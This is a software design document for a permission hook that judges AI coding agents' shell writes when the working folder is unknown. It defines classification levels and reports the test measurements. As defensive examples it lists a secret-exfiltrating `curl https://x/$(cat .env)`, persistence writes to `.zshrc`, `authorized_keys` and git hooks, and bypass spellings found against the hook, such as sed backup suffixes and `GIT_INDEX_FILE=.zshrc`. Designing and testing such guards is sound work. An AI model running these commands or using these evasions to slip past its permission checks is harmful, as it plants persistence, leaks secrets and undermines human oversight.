# Writes in an unknown folder

Status: built (2026-10-08). Design approved 2026-10-08 with `developer` as the default; §12 records
what the build changed from the draft, and the measurements.

## 1. The problem

Some harnesses do not tell the hook which directory a command will run in. Codex's
`PermissionRequest` event is the case that forced it: `exec_command` takes a `workdir` that
neither hook payload carries, and an approval on that event lifts the sandbox (HARNESS-BEHAVIORS.md
§Codex `PermissionRequest`). Any harness that sends no `cwd` at all is in the same position; the
residuals of `hard-problems.md` HP-19 list the ones that send no cwd or no root, which today fall
back to treating a relative path as the workspace. Deletion is the HP-8 case: whether `rm -rf build`
is recoverable depends on where it runs, so the levels below decide what each one assumes.

What ships for that case is deliberately blunt. The command is classified at `UNKNOWN_WORKDIR`, and
`targets::respond` grants nothing above `SafeRead` where `cwd_is_the_commands()` is false. Every
write goes to the harness's own prompt.

That is safe and costs a prompt on most of a coding session: `cargo fmt`, `git commit -am x`,
`mkdir -p build`, `echo x > notes.md`. Writes are not equal. `cargo build` in an unknown folder
fills a `target/` directory the tool owns; `echo x >> .zshrc` in an unknown folder may be planting
code in the user's shell startup. This document separates them.

## 2. What is actually unknown

The folder is the anchor for two things, and only those two:

1. **Relative paths a command names** (`echo x > out.txt`, `tee .zshrc`, `cp a b`, `rm -rf build`).
2. **Writes a command makes to its working directory without naming a path** (`cargo fmt`,
   `git add .`, `cargo build`, `npm ci`, `prettier --write .`).

A third thing follows from the second: **code the folder holds**, which a command runs without
naming it (`cargo test`, `npm test`, `make`, `pytest`).

Everything else classifies exactly as it does with a known folder. An absolute path, a `~` path,
`/tmp`, `/dev/null`, a credential-store name and the network facets do not depend on the anchor.
So the design adds one question per write, *how much does this write depend on the anchor, and
what could the anchor be*, and leaves the rest of the facet model alone.

## 3. Where the command could be running

The agent chooses the folder. The plausible choices, roughly in order of how often a coding agent
picks them:

| Anchor | Example | What a relative write there can do |
|---|---|---|
| the project root | `~/projects/app` | ordinary project edit |
| a subdirectory of it | `~/projects/app/web` | ordinary project edit |
| a sibling project | `~/projects/lib` | patch a peer repo (developer already allows this by path) |
| scratch | `/tmp/x` | nothing lasting |
| the home directory | `~` | write a dotfile (`.zshrc`, `.gitconfig`), a LaunchAgent, a `bin/` script |
| a config or credential directory | `~/.ssh`, `~/.config/fish`, `~/.aws` | `authorized_keys`, `config` with a `ProxyCommand`, `credentials` |
| an untrusted checkout | `~/Downloads/repo` | nothing by writing; everything by running its code |
| a system directory | `/etc`, `/usr/local/bin` | mostly refused by the OS for a non-root user; `/usr/local` often is not |

The design's job is to approve what is harmless under every anchor a level assumes, and to name
the anchors each level accepts the risk of.

## 4. The facets

Each write a command makes gets one value on a new axis, **anchor dependence**. The other facets
(`operation`, `reversibility`, `persistence`, `scale`, `execution`) keep their meaning and still
apply.

It earns a new axis by the test every facet had to pass (`behavioral-taxonomy-v1.4.md`): a real
form the vocabulary cannot express, and independence from the existing axes. `anchoring`
(`literal < anchored < opaque`) says how firmly a path is pinned *given* its base; this says
whether there is a base at all. `echo x > out.txt` is `literal` and still lands anywhere. The
values below were drawn from the anchor table in §3 and the region roles, not chosen in advance,
and each has a positive example and a near-miss negative.

| Value | What it is | Examples |
|---|---|---|
| `anchor-free` | the target is pinned without the folder | `> /tmp/x`, `> /dev/null`, `tee ~/.zshrc`, `cp a /etc/hosts` |
| `relative-plain` | a relative path, no `..`, no hidden segment, no sensitive name | `> out.txt`, `mkdir -p build/x`, `tee src/gen.rs`, `cp a.txt b.txt` |
| `relative-sensitive` | a relative path whose name means something wherever it lands | `>> .zshrc`, `tee .git/hooks/pre-commit`, `> .envrc`, `tee authorized_keys`, `cp x Library/LaunchAgents/y.plist`, `> .config/fish/config.fish`, `> bin/ls` |
| `relative-unplaced` | a relative path that climbs out, or one that cannot be read off the command line | `> ../x`, `> $DIR/x`, `cp *.txt out/`, an `xargs` item |
| `implicit-output` | the tool writes into its working directory, only into a subtree it owns and regenerates | `cargo build` (`target/`), `npm ci --ignore-scripts` (`node_modules/`), `pytest` cache, `go build -o` absent |
| `implicit-source` | the tool rewrites existing files in its working directory, confined to its own kind of project | `cargo fmt`, `gofmt -w .`, `prettier --write .`, `git add .`, `git commit -am x` |
| `runs-folder-code` | the command executes code the folder holds | `cargo test`, `npm test`, `make`, `pytest`, `./script.sh` |

And one property the operation facet already carries, which matters more here than with a known
folder: **create-new vs change-existing vs destroy.** Creating `out.txt` in the wrong folder leaves
a stray file. Appending to `config` in the wrong folder may reconfigure ssh. `rm -rf build` in the
wrong folder deletes someone's `build`.

**Redirects are not a separate category.** `echo x > f`, `tee f` and `cp a f` write the same file
and get the same anchor value. What the shipped `PermissionRequest` rule refuses about shell syntax
is a different hazard, data spliced into a network command (`curl https://x/$(cat .env)`). That
refusal should narrow to the constructs that feed a network command, so a redirect to a
`relative-plain` file is judged as a write and nothing else.

## 5. Detecting each value from the command alone

All of it comes from what the classifier already computes; nothing reads the filesystem.

- **`anchor-free` vs relative.** `pathctx::resolve` already distinguishes an absolute, `~` or
  stream path from a relative one. Today a relative path under `UNKNOWN_WORKDIR` simply lands
  outside every workspace. Instead, record that the path was relative and carry it to the next test.
- **`relative-sensitive`: resolve twice.** Resolve the relative path against two probe anchors and
  classify both with the existing region table:
  - a synthetic workspace root. A hit on `worktree-trusted` (`.git/`, `.envrc`, hooks, CI
    config) or the credential shield makes it sensitive, as it would be in a known project;
  - `~`. A hit on any named home region makes it sensitive: the credential shield, a hidden
    segment, or a new list of **home persistence paths** (`Library/LaunchAgents`, `bin`,
    `.local/bin`, `Library/Application Support/*/plugins` and the like), researched and dated
    like every other region node.

  The sensitive names are the union of what the region model already knows plus that list. The
  test reads `regions/default.toml`, so a node added later is covered without anyone remembering.
- **`relative-unplaced`.** A `..` that climbs above the anchor, a glob, `$VAR`, `$(…)` or an
  xargs item in a write target. The resolver already marks these unpinnable; the change is to
  keep them distinct from `relative-plain`.
- **`implicit-output` and `implicit-source`.** These need data the registry does not hold yet. A
  command's TOML says what it writes when it names no path:
  ```toml
  writes_cwd = "output"   # or "source", or omitted for none
  output_dirs = ["target"]
  ```
  The first task is a sweep of the registry for commands whose profile has
  `operation = create|mutate|destroy` and no path positional or output flag, so the population is
  counted before it is labelled. A guard then fails on any such command that lacks the field, the
  same way the registry's other `every_*` guards work.
- **`runs-folder-code`.** The `executor = "project"` field exists and only cargo uses it. The same
  sweep lists test and build runners (`npm test`, `pytest`, `go test`, `make`, `rake`, `mix test`,
  `gradle`, `mvn`) and gives each the field.

## 6. The levels

The folder level is a second dial beside `--level`. A command passes when it passes both; the
folder level never loosens what `--level` refuses.

| Value | `reads` | `developer` (proposed default) | `workspace` |
|---|:--:|:--:|:--:|
| reads and anything below `SafeRead` | ✓ | ✓ | ✓ |
| `anchor-free` write | · | as `--level` decides | as `--level` decides |
| `relative-plain` create or change | · | ✓ | ✓ |
| `relative-plain` destroy (`rm build/x`, `rm -rf dist`) | · | · | ✓ |
| `implicit-output` | · | ✓ | ✓ |
| `implicit-source` | · | ✓ | ✓ |
| `runs-folder-code` | · | ✓ | ✓ |
| `relative-unplaced` | · | · | `..` into a sibling only |
| `relative-sensitive` | · | · | · |

✓ approve. · leave to the harness's prompt.

**`reads`** is what ships now. Choose it when a prompt per write is the price you want.

**`developer`** assumes the folder is one a developer would point a coding agent at: a project, a
part of one, scratch, or a sibling. It approves what such a developer approves in a known project,
except deletion. What it refuses is everything whose harm depends on the folder being something
else: a dotfile or hook name, a persistence path, a path that climbs out, and any deletion.

The risk it accepts, stated plainly: if the agent sets the folder to `~/.ssh` and appends to a file
with an ordinary name (`>> config`), that is approved. The sensitive-name test cannot catch a
generic name inside a sensitive folder, because the folder is exactly what is unknown. This is the
case the measurement in §8 counts and reports, and the reason `reads` stays available.

`runs-folder-code` is on at `developer` because a developer level that prompts for `cargo test`
prompts for most of a session, and in a known project the same level runs it. The cost is that a
command approved on Codex's `PermissionRequest` runs outside the sandbox, so a test suite in an
untrusted checkout runs unconfined. Getting there takes an agent that has already cloned or
downloaded that code and chosen to run it, which earlier commands in the session would show.

**`workspace`** treats the folder as the workspace: everything the known-folder `developer` level
does, including relative deletion and `../sibling` writes. Still never `relative-sensitive`.

No level approves `relative-sensitive`. In a known folder those names are frozen too
(`worktree-trusted`, the credential shield), so this only keeps the unknown-folder case from being
looser than the known one.

## 7. Choosing a level

In the user configuration only, never a project's `.safe-chains.toml`, so a checkout cannot loosen
it:

```toml
# ~/.config/safe-chains.toml
[unknown_folder]
writes = "developer"   # "reads", "developer" or "workspace"
```

And on the hook's command line, for a single harness: `safe-chains hook codex --unknown-folder=reads`.
The flag wins over the file. A harness that does report the folder ignores both.

`safe-chains --explain` names the anchor value of each write and, when the folder level is what
refused it, says so and names the setting.

## 8. Measuring it

The level is not done until it is measured, the same way the levels themselves were (the
golden-set in `behavioral-taxonomy-golden-set.md`).

**Three labelled sets:**

1. **A realistic set** of commands agents actually run, drawn from decision logs of sessions where
   the folder *was* known, with the folder stripped. Each command is labelled, before the engine's
   answer is seen, with what a careful developer would want at each folder level. This set measures
   **false prompts**: commands a level should approve and does not.
2. **An adversarial set** generated, not hand-picked: every sensitive name in the region table and
   the home persistence list, in every write spelling (`>`, `>>`, `tee`, `tee -a`, `cp`, `mv`,
   `install`, `ln -s`, `-o`/`--output`, `sed -i`), under every anchor in §3. Each item is labelled
   with the worst outcome over the anchors. This set measures **misses**: approvals that write a
   sensitive place under an anchor the level claims to cover.
3. **The accepted-risk set**: generic names under sensitive anchors (`>> config` with the folder at
   `~/.ssh`). Not a pass/fail set. Its count, per level, is published in the docs so the residual
   risk is a number, not a sentence.

Labels are done twice, independently, with disagreements settled and recorded before the engine
runs. A label is a person's or an oracle's, never the engine's or a model's own answer stored back
as a reference: a reference set a model wrote agrees with that model by construction. A label is
never changed to make a run pass; a disputed label is ruled on and the ruling recorded.

**An oracle for the labels.** Where a label is in doubt, run the command in a throwaway directory
tree built to stand in for each anchor (a fake project, a fake home with dotfiles, a fake `.ssh`)
and diff the tree afterwards. Seeing a write land somewhere proves it does; not seeing one proves
nothing, so the oracle can only confirm a hazard label, never clear one.

**Errors are scored by direction.** A miss (approved where the label says prompt) and a false
prompt (prompted where the label says approve) are counted separately and never traded against
each other: a wrong prompt costs a click, a wrong approval is a hole.

**Bars:**

- **Misses on the adversarial set: zero**, at every level. A miss is a bug and blocks release.
- **The adversarial set is big enough to mean it**: at least 50 distinct hazard inputs per level,
  so the bar cannot be met by asking the same few inputs repeatedly, and at least 20 near-miss safe
  inputs (`> config.json` in a project, `tee notes/ssh.md`), so a level that prompts for everything
  cannot pass either.
- **False prompts on the realistic set**: `developer` approves at least 90% of what its labels
  approve. The number is a target to measure against, not a promise; the first measurement sets the
  ratchet, and it may only rise.
- **Anchor soundness, as a property test.** For every command the folder level approves and every
  anchor that level covers, classifying the same command with that anchor as a *known* folder must
  not land a write in a `worktree-trusted`, credential-shield or home-persistence region. The
  anchors come from §3's table and the region file, so a new region node becomes a new witness.

The adversarial set and the property test live in this repository's tests. A realistic set drawn
from a user's own logs holds real paths and project names, so it stays outside the public
repository and only its counts are published.

## 9. Where it lives

A module in safe-chains, not a new repository. Everything it needs is already here: the parser,
the path resolver, the region table, the levels, the harness targets and the user configuration.
A separate crate would either reimplement those or depend on internals that are not a public API,
and the setting it adds is one users set in safe-chains' own configuration. It is a separate piece
of work with its own design document, its own guards and its own measurement, which is the sense
in which it is its own project.

Proposed layout: `src/engine/resolve/anchor.rs` (the anchor value and the double resolution), the
`writes_cwd` field in `src/registry/`, the setting in `src/policy.rs`, and the level in
`targets::respond`, replacing `within_unknown_workdir_ceiling`.

## 10. What would make most of this unnecessary

Codex putting `workdir` in the `PermissionRequest` payload. With the folder known, the command
classifies like any other and only harnesses that send no folder at all would need the dial. That
request should go upstream regardless; this design is for until it lands, and for the harnesses
that never send one.

## 11. Order of work

1. Sweep the registry for implicit writers and folder-code runners; count them.
2. Build the adversarial set generator and the anchor-soundness property against today's
   `reads` behaviour (it must pass trivially).
3. The anchor value and double resolution, with the home persistence list.
4. `writes_cwd` and `executor = "project"` across the swept commands, with the `every_*` guard.
5. The setting and the flag, `--explain` output, the docs.
6. Measure; record the numbers here; set the ratchet.

## 12. As built (2026-10-08)

**Where it lives.** Not quite §9's layout: the anchor value and the placement rules are
`src/pathctx/anchor.rs`, beside the resolver they change; the per-evaluation state (the level in
force, the record `--explain` reads, the frame each command leaf is judged in) is
`src/pathctx/folder.rs`; the registry field is `src/registry/cwd_writes.rs`; the setting is
`src/registry/folder_config.rs`; the home persistence list is the `persistence` role in
`regions/default.toml`. `targets::respond` keeps the `reads` ceiling and lifts it only when a folder
level above `reads` judged the command.

**How a write is judged.** Two seams, both fail-closed:

- `pathctx::resolve_for` places each relative path a command writes by its anchor value and use
  (`anchor::placement`): into the workspace when the level approves it, otherwise into the unknown
  folder, where no write is approvable. A relative read is placed at every level, `reads` included
  (the owner, 2026-10-08: "If a user chose to run from home, that's their choice"), so `grep -r foo
  src`, `ls src` and `grep x tests/*.rs` are approved; a glob is allowed only in the last segment, and
  a read that could be a secret (a credential-shield node as written or under `~`, the end of one, a
  key file) is placed nowhere. A path that climbs out of the folder, or cannot be read off the
  command line (`$VAR`, a glob above the last segment, braces), is placed nowhere at every level,
  reads included: joined onto the unknown folder it named an ordinary directory,
  while the real parent of an unknown folder can be anything. That change also applies at `reads`,
  so it tightens what shipped: `cat ../x` now goes to the prompt there too. The `level_monotonic`
  fuzz target found it on its first burst (`cp a ../ x`, approved at `developer` while the project
  root, under another user's home, refused it).
- `folder::judge_leaf` wraps every command leaf. A leaf whose verdict is a write, run in the unknown
  folder, is approved only if it declares what it writes (`writes_cwd`), or a command nested in it
  was accounted for. Anything else is refused, so a writer nobody labelled fails closed. A command
  that writes only the paths it names declares `named`, and each of those paths is placed or
  refused on its own; naming a path is not enough without the declaration, because a decompressor
  names its input and writes a name derived from it (`unxz -f authorized_keys.xz`). An assignment
  in front of a command voids an implicit declaration, since it can move the write
  (`GIT_INDEX_FILE=.zshrc git add .`).
- While a run-time item is in scope, an `xargs` item or a loop variable (`while read f`), no write is
  placed: the classifier sees an ordinary stand-in name, and the real item can be `.zshrc`
  (`ls -A | xargs -I{} sh -c 'echo x >> {}'`).
- The folder itself (`.`) is a write target only for a command that declares it writes its own
  files there (`gofmt -w .`, `rubocop -a`). A copy, move, link or sync into `.` writes the names its
  sources bring (`cp /tmp/.zshrc .` writes `~/.zshrc` when the folder is home).
- A transfer into a directory is also judged at the name each source arrives under
  (`capability::transfer_profile`, shipped in 0.231.3). That closed the same hole in known folders: `cp /tmp/.envrc .`
  wrote `./.envrc`, which direnv runs, and had been approved because only `.` was classified. A
  source copied by its contents (`cp -r src/. dest`) brings names nobody wrote down, which an unknown
  folder treats as hidden and so refuses.
- An in-place edit's backup is judged where it lands (`resolve::backup`, shipped in 0.231.3). GNU sed and perl put the
  file's name where the suffix has a `*` and accept a directory there, so in known folders too
  `sed -i'.git/hooks/*' s/x/x/ pre-commit` wrote a git hook and had been approved.

**Sensitive names.** Beyond §5's two probes (the path as written, and under `~`), a relative path is
sensitive when it starts with the end of any node under `~` (`LaunchAgents/x.plist` for
`~/Library/LaunchAgents/`, `git/config` for `~/.config/git/`, `autostart/x.desktop` for
`~/.config/autostart/`), so it is caught whichever folder under home the command runs in. The
`persistence` role names XDG and macOS start-up places and Codex's own folder (`~/.codex/`), and the
named files include Claude Code's and Codex's hook and permission files (`hooks.json`,
`settings.local.json`, `rules/default.rules`).

**The declaration.** `writes_cwd` on a command or a sub takes five values, not §5's two:
`"output"` (with `output_dirs`), `"source"`, `"none"` for a writer whose writes are somewhere fixed
and not in its folder (`pkill`, `rustup target add`, `pyenv install`), `"code"` for a task that runs
the folder's code without the `executor = "project"` dispatch (`rake db:migrate`, `xcodebuild`), and
`"named"`. `executor = "project"` counts as `"code"`. Values are checked when the registry loads.

**The sweep (§11 step 1).** The verdict snapshot's 21,758 write invocations, run with the folder
unknown at `developer`, named 1,406 command keys whose write nothing accounted for before `named`
existed. 225 commands and subs are labelled (cargo, git, jj, rake and rails tasks, version
managers, Apple and .NET build tools, formatters, and `named` for coreutils' writers, `sed`, `perl`,
interpreters and named-output converters); 1,384 keys remain in
`tests/fixtures/unknown_folder_owed.txt`, which may only shrink: `tests/unknown_folder_owed.rs` fails
on a new unlabelled writer and on a labelled one still listed. Most of the remainder write a file
named after their input (`unxz`, `pigz`, `lame`), bring a source's names (`rsync`, `ditto`, `tar`),
or take a path in a flag that can point anywhere (`mise use -p`, `curl -O`); they stay refused. A
label is research, not a guess. Commands decided by a Rust handler with no TOML entry (`bash`, `sh`)
cannot be labelled yet and are refused.

**Test runners.** `cargo test`, `npm test` and `pytest` classify at the read level, so they were
approved at `reads` before any of this and are at every level. `runs-folder-code` matters only for
commands classified as writes (`cargo run`, `swift build`, `rake db:migrate`).

**Measurements.**

- Adversarial set (`tests/unknown_folder.rs`): every relative spelling of every region node, the
  anchor module's named files and git hooks, the usual dotfiles and climbing paths, in 13 write
  spellings, plain and below a `cd`: 4,836 hazards, 0 approved at any level. Every named file and
  hook copied, moved, linked or synced into the folder itself, and contents copies: 0 approved.
  The 32 cases an adversarial review found on the first build: 0 approved. 23 near-miss writes, all
  approved at `developer`, none at `reads`.
- Accepted risk (§8 set 3): 9 ordinary names (`config`, `config.json`, `config.toml`, `hosts`,
  `settings.yml`, `x.plist`, `data.txt`, `ls`, `AGENTS.md`) written into 12 sensitive folders
  (`~/.ssh`, `~/.aws`, `~/.kube`, `~/.docker`, `~/.gnupg`, `~/.config/git`, `~/Library/LaunchAgents`,
  `~/bin`, `~/.local/bin`, `~/.codex`, `~/.claude`, `.git`): 108 approvals at `developer` and at
  `workspace`, 0 at `reads`. Since the folder is what is unknown, every ordinary name counts in every
  folder. `ls` written into `~/bin` shadows the real `ls`; `config.toml` in `~/.codex` reconfigures
  Codex; `AGENTS.md` there gives it new instructions. The test pins the number.
- Anchor soundness: a property (`pathctx::folder::soundness`) that whatever a level approves, run in
  the project root, a subdirectory, a sibling or scratch, writes nowhere at `worktree-trusted` or
  above, and at `developer` names nothing the region table names when run in `~`; and that no level
  approves what the project root refuses, each approving at least what the stricter one does. The
  `level_monotonic` fuzz target asserts the second over arbitrary input.
- Realistic set: 300 commands sampled from this machine's agent transcripts among those approved
  with their folder known, kept outside this repository. Two labellers, one reading every command
  and one applying the §6 table, both labelled all 300 approve; no rulings were needed. Approved with
  the folder unknown: `reads` 269 (90.0%), `developer` 288 (96.3%), `workspace` 288. Misses: 0. The
  11 `developer` still prompts for are mostly words whose value the parser cannot know (a `jq`
  filter, a glob above the last segment, a `$(…)`) and 2 `curl -o`, unlabelled because `-O` names
  its output after the URL. The ratchet starts at 96.3%.
